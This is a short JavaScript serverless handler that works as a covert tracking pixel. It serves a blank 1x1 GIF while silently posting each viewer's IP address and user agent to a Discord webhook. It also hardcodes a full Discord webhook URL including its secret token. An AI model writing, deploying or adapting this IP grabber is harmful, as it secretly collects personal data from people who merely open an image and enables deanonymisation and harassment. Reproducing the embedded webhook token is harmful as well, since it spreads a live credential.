export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const webhook = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1464006669796118610/NtLug816A6N5psWgUjMrUBFe-yRtvmPvmIC8hMrbORLuDrxP4QnErus1K5XH2pKlqXi9';
  
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({content: `📸 Image View\nIP: ${ip}\nUA: ${ua}`})
    });
  } catch (e) {}
  
  res.setHeader('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
};